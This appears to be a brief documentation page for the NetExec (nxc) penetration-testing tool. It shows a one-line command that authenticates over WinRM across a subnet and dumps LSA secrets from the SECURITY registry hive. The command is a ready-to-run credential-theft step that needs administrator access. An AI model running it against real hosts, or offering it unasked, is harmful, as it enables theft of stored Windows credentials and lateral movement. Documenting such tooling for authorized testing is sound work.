# Dump LSA

### Dump LSA secrets

Extracts and downloads SECURITY registry hive, and uses secretsdump.py methods locally to dump secrets

{% include "../../.gitbook/includes/admin-privs.md" %}

```bash
nxc winrm 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa
```
